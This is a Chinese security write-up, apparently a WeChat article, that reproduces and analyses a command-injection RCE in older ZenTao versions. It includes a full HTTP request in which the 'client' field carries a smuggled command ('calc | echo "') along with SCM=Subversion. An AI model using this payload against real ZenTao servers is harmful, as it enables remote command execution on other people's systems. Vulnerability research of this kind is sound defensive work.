<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/G2H6Na96FtU942ICRlrhsQ)

漏洞简介
----

禅道是第一款国产的开源项目管理软件。它集产品管理、项目管理、质量管理、文档管理、 组织管理和事务管理于一体，是一款专业的研发项目管理软件，完整地覆盖了项目管理的核心流程。  
禅道管理思想注重实效，功能完备丰富，操作简洁高效，界面美观大方，搜索功能强大，统计报表丰富多样，软件架构合理，扩展灵活，有完善的 API 可以调用。

禅道后台存在 RCE 漏洞，均存在于历史版本，对这些漏洞进行复现分析。

环境搭建
----

源码下载地址 https://dl.cnezsoft.com/zentao/18.0.beta1/ZenTaoPMS.18.0.beta1.php7.2_7.4.zip

利用 phpstudy 来进行环境的搭建

![](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LcO9UBTAkofdLmG2w75Cl49rVZqs0HKFHVxlhZUb4x8HS5Rk7lkaWFZVHFg0EhMjXwQ3RyOGEhgwA/640?wx_fmt=other)

漏洞复现
----

登录后台创建 GitLab 类型的代码库

![](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LcO9UBTAkofdLmG2w75Cl49vW6ibQClfpvKfzNniav9ibHm8fUGyXfZvlrymWkupS2qJbLoL87KdbPkA/640?wx_fmt=other)![](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LcO9UBTAkofdLmG2w75Cl49vUxaia0OXiaueXoFib6Fn6wiac5gELsROY2ThR6tHZpv3JZUEVV5ok2HKQ/640?wx_fmt=other)

点击 DevOps 模块的设置选项，修改创建的代码库

![](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LcO9UBTAkofdLmG2w75Cl49HYibmWCM9ffzd0iaSaySImApjjpicYRxdn0jn3LjhKEpMaNRqJtUQYHUg/640?wx_fmt=other)![](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LcO9UBTAkofdLmG2w75Cl49VwLE5EEZFyZbMldvEMI66eXjTicibjSOrAbdWKOXR25G0PaOLrVcjnDQ/640?wx_fmt=other)

点击保存并抓取数据包

修改参数 SCM 和 client SCM 修改为 `Subversion` client 修改为 `calc | echo "`

![](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LcO9UBTAkofdLmG2w75Cl49g53ia9a7wmKWRbH7gzY380Vbjn1iacpqJcx79R04ibhaV78Q2tRxKGk0A/640?wx_fmt=other)

触发了命令执行，执行了两次

![](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LcO9UBTAkofdLmG2w75Cl49pBqrmjnCGF7cFPB51yZsOjDvCweRMX1CyxY6a5AyutJiagmufo4DDicg/640?wx_fmt=other)

漏洞分析
----

发现有一些分析文章中描述需要先创建一个代码仓库，也指出了创建代码仓库的原因，因为调用的是 edit 方法，所以要先 create

经过调试发现这是必须的，因为在没创建代码库时，执行 edit 方法，会提示跳转去创建代码库

`module/repo/control.php#commonAction`

![](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LcO9UBTAkofdLmG2w75Cl49J8wNDBLpOoytSGQbBLHIPQW2OshsV1SG8ickhxzwSW9n9CdtK8WBJbg/640?wx_fmt=other)

所以需要先创建代码库

`module/repo/control.php#create`

![](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LcO9UBTAkofdLmG2w75Cl49l2hf1O8j3dT8cwj5FDwQPLfl3fWHWt3bB3fPLFHvQLgKAibFDlUCGNA/640?wx_fmt=other)

`module/repo/model.php#create`

![](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LcO9UBTAkofdLmG2w75Cl490iaR3907Dhx7bZzfcCibxtvibF1sV93HqlvjzEJiaXficOgdFhyvNAqRcEg/640?wx_fmt=other)

在创建代码库的时候有一个检查 Client 的操作 只有选择 Gitlab 才能不做客户端的检测操作，直接创建成功

`module/repo/model.php#checkClient`

![](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LcO9UBTAkofdLmG2w75Cl495HbFvGyhOpye4icNdOMjNXTngwlibmC25q378yQmfMdfgjDcWHiaqNnkQ/640?wx_fmt=other)

创建成功后执行编辑操作触发漏洞

```
POST /index.php?m=repo&f=edit&repoID=0 HTTP/1.1
Host: test.test
Content-Length: 36
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://test.test
Referer: http://test.test/index.php?m=repo&f=edit&repoID=1&objectID=0
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: zentaosid=bp9k0pcftu49b2ethm9f32hc5b; lang=zh-cn; device=desktop; theme=default; preExecutionID=1; moduleBrowseParam=0; productBrowseParam=0; executionTaskOrder=status%2Cid_desc; windowWidth=1440; windowHeight=722; tab=devops; repoBranch=master;XDEBUG_SESSION=PHPSTORM
Connection: close

SCM=Subversion&client= calc | echo "

```

`module/repo/control.php#edit`

![](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LcO9UBTAkofdLmG2w75Cl49HibPiaL7kKIz99icMHFIen4Ak3rbRptEAKWf6D9aVnlmMbnib6uE77BPjA/640?wx_fmt=other)

`module/repo/model.php#update`

![](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LcO9UBTAkofdLmG2w75Cl497mbMYgQW60cqbm9iaT1xuoib83yIDtuLpyZjD5R1hl6fwicnebmOZFIlA/640?wx_fmt=other)

`module/repo/model.php#checkConnection`

![](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LcO9UBTAkofdLmG2w75Cl49icLjg3tOzksE1Qs8N8VMkicwPkicp0v7TZhg5s9fvZhUib9QmP5kAItSBw/640?wx_fmt=other)![](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LcO9UBTAkofdLmG2w75Cl49kribNtby0nwlia48qQld3jh36LyahKwfZygmRAKPQCye3OKkCccLSBJw/640?wx_fmt=other)

修复建议
----

更新至最新版本

**原创稿件征集**

征集原创技术文章中，欢迎投递

投稿邮箱：edu@antvsion.com

文章类型：黑客极客技术、信息安全热点安全研究分析等安全相关

通过审核并发布能收获 200-800 元不等的稿酬。

[更多详情，点我查看！](http://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&mid=2652885477&idx=1&sn=39e97a60d7b68d19569284654e74ffa1&chksm=bd59ad288a2e243e4d89b7c456fbd44a93d241c881075b342af22431d93dca56e52076ed75ce&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC6iavic0tIJIoZCwKvUYnFFiaibgSm6mrFp1ZjAg4ITRicicuLN88YodIuqtF4DcUs9sruBa0bFLtX59lQQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)

靶场实操，戳 “阅读原文”